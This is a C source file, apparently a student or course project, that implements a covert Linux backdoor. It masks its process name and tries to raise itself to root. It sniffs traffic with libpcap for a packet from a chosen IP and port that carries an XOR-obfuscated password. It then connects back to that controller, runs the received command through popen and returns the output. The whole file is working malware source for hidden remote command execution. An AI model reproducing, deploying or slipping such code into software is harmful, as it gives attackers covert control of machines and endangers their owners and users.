#include "backdoor.h"

int main(int argc, char *argv[])
{
	/* mask the process name */
	memset(argv[0], 0, strlen(argv[0]));	
	strcpy(argv[0], MASK);
	prctl(PR_SET_NAME, MASK, 0, 0);

	/* change the UID/GID to 0 (raise privs) */
	setuid(0);
	setgid(0);
	
	if(startPacketCap() == 0)
	{
		return 0;
	}
	return 1;
}

int startPacketCap() { 
    pcap_if_t *all_dev, *d; 
    struct bpf_program fp;
    char errbuf[PCAP_ERRBUF_SIZE];
    char *cfilter = malloc(sizeof(char) * 512);
   	pcap_t* nic_descr;
   	bpf_u_int32 netp;
    bpf_u_int32 maskp;
    
   	snprintf(cfilter, 512, "src %s and src port %s", FILTER_IP, FILTER_PORT);
	
	if (pcap_findalldevs(&all_dev, errbuf) == -1)
    {
		fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
		return 0;
	}
	
	//Find a suitable nic from the device list
    for (d = all_dev; d; d = d->next)
    {
		if (d->addresses != NULL)
		{
			break;
		}
    }
	// Use pcap to get the IP address and subnet mask of the device 
	pcap_lookupnet (d->name, &netp, &maskp, errbuf);
    	
	// open device for reading 
	nic_descr = pcap_open_live (d->name, BUFSIZ, 0, -1, errbuf);
	if (nic_descr == NULL)
	{ 
		printf("pcap_open_live(): %s\n",errbuf); 
		return 0; 
	}
	
	// We only want traffic from the machine that will be sending inputs
	if (pcap_compile (nic_descr, &fp, cfilter, 0, netp) == -1)
	{ 
		fprintf(stderr,"Error calling pcap_compile\n"); 
		exit(1);
	}
	
	// We only want traffic from the machine that will be sending inputs
	if (pcap_setfilter (nic_descr, &fp) == -1)
	{ 
		fprintf(stderr,"Error setting filter\n"); 
		exit(1); 
	}

	// Call pcap_loop(..) and pass in the callback function 
	pcap_loop(nic_descr, -1, packetRecieved, NULL);

	/* cleanup */
	pcap_freecode(&fp);
	pcap_close(nic_descr);

	return 1;
}

void packetRecieved(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	/* declare pointers to packet headers */
	struct ethhdr *ethernet_header;
	struct iphdr *ip_header;
	struct tcphdr *tcp_header; 
	int len;
	int size_ip;
	char *encryptedPass = malloc(sizeof(char) * 4);
	char *deCryptPassword = malloc(sizeof(char) * 4);
	char *key = NULL;
	
	
	if ((len = (sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr))) > 40)
	{
		ethernet_header = (struct ethhdr *)packet;
		if(ntohs(ethernet_header->h_proto) == ETH_P_IP)
		{
			ip_header = (struct iphdr *)(packet + sizeof(struct ethhdr));

			// Print some IP Header Fields
			//printf("Source IP address: %-15s\n", inet_ntoa(*(struct in_addr *)&ip_header->saddr));
			//printf("Dest IP address: %-15s\n", inet_ntoa(*(struct in_addr *)&ip_header->daddr));
			

			if(ip_header->protocol == IPPROTO_TCP)
			{
				tcp_header = (struct tcphdr*)(packet + sizeof(struct ethhdr) + ip_header->ihl*4);
				/* Print the Dest and Src ports */
				if(ntohl(tcp_header->ack_seq) == 0) {
				} else {
					return;
				}
				printf("Source Port: %d\n", ntohs(tcp_header->source));
				printf("Dest Port: %d\n", ntohs(tcp_header->dest));
				printf("ACK #: %u\n", ntohl(tcp_header->ack_seq));
				printf("SEQ #: %u\n", ntohl(tcp_header->seq));	
				printf ("TCP Flags:\n");
				printf("  URG: %u\n", tcp_header->urg);
				printf("  ACK: %u\n", tcp_header->ack);
				printf("  PSH: %u\n", tcp_header->psh);
				printf("  RST: %u\n", tcp_header->rst);
				printf("  SYN: %u\n", tcp_header->syn);
				printf("  FIN: %u\n", tcp_header->fin);
				
				printf("Password Received\n");
				size_ip = ip_header->ihl*4;
				memcpy(encryptedPass, (packet + SIZE_ETHERNET + size_ip + 4), sizeof(__uint32_t));
				key = strdup(encryptKey);
				deCryptPassword = xor_encrypt(key, encryptedPass);
				
				 if(strncmp(deCryptPassword, password, 4) != 0)
				{
					fprintf(stderr, "password does not match\n");
					return;
				}
				
				if(acceptCommand(ntohs(tcp_header->source), ip_header->saddr) != 0)
				{
					fprintf(stderr, "sendCommand() failed\n");
					return;
				}
			} else
			{
				printf("Not a TCP packet\n");
			}
		}
		else
		{
			printf("Not an IP packet\n");
		}	
	}
	else
	{
		printf("TCP Header not present \n");
	}
	
	
	
////////////////////////////////////////////////////////////////////////////////////////	
	/*// define/compute ip header offset
	ip = (struct iphdr*)(packet + SIZE_ETHERNET);
	size_ip = ip->ihl*4;
	if (size_ip < 20) {
		fprintf(stderr, "Invalid IP header length\n");
		return;
	}
	
	//determine protocol	
	switch(ip->protocol) {
		case IPPROTO_TCP:
			break;
		default:
			return;
	}
	
	
	
	//define/compute tcp header offset 
	tcp = (struct tcphdr*)(packet + SIZE_ETHERNET + size_ip);
	size_tcp = tcp->doff*4;
	if (size_tcp < 20) {
		fprintf(stderr, "Invalid TCP header length\n");
		return;
	}
	printf("We want to connect to port: %d\n", tcp->dest);
	printf("Password Received\n");
	memcpy(encryptedPass, (packet + SIZE_ETHERNET + size_ip + 4), sizeof(__uint32_t));
	key = strdup(encryptKey);
	deCryptPassword = xor_encrypt(key, encryptedPass);
	
	printf("Passwords: %s, %s\n", deCryptPassword, password);
	
	//Password compare between the one we recieved and the one we should get
    if(strncmp(deCryptPassword, password, 4) != 0)
	{
		fprintf(stderr, "password does not match\n");
         return;
	}
	
	if(acceptCommand(tcp->source, ip->saddr) != 0)
	{
		fprintf(stderr, "sendCommand() failed\n");
        return;
	}*/
}

int acceptCommand(int sourcePort, unsigned long sourceIp )
{
	int sd;
	struct	sockaddr_in controllerSocket;
	int bytes_to_read = 0, n = 0;
	char *bp = NULL;
    char buffer[100];
    FILE *pf;
    char command[100];
    char data[2048];
    
    printf("We want to connect to port: %d\n", sourcePort);
    
    
	//Now that we have our password lets make a socket with the controller
	// Create a stream socket
	if ((sd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		fprintf(stderr, "Can't create a socket\n");
		return -1;
	}
	
	bzero((char *)&controllerSocket, sizeof(struct sockaddr_in));
	controllerSocket.sin_family = AF_INET;
	controllerSocket.sin_port = htons(sourcePort);
	controllerSocket.sin_addr.s_addr = sourceIp;
	
	//Make a connection to the controller
	if(connect(sd, (struct sockaddr *)&controllerSocket, sizeof(controllerSocket)) == -1)
	{
           fprintf(stderr, "can't connect to server\n");
           return -1;
	}
	
    bp = buffer;
    bytes_to_read = 100;
    
    while(recv(sd, bp, bytes_to_read, 0) < 100 )
    {
        bp += n;
		bytes_to_read -= n;
    }
    
	printf("Command: %s\n", buffer);
	  
	/*The following code was taken from http://www.lainoox.com/how-to-execute-shell-commands-c/ */
    // Execute a process listing
    sprintf(command, buffer); 
 
    // Setup our pipe for reading and execute our command.
    pf = popen(command,"r"); 
 
    if(!pf){
      fprintf(stderr, "Could not open pipe for output.\n");
      return -1;
    }
    
    // Grab data from process execution
    while(fgets(data, 80 , pf) != NULL) {
		// Print grabbed data to the screen.
		fprintf(stdout, "%s",data); 
		send(sd, data, 80, 0);
	}
    if (pclose(pf) != 0)
        fprintf(stderr," Error: Failed to close command stream \n");
    
    //Send back results
	
	close(sd);
	return 0;
}

// Usage Message
void usage (char **argv)
{
      fprintf(stderr, "Usage: %s -s <Filter IP> -p <Filter Port>\n", argv[0]);
      fprintf(stderr, "Example: %s -s 192.168.0.15 -p 10022\n", argv[0]);
      exit(1);
}
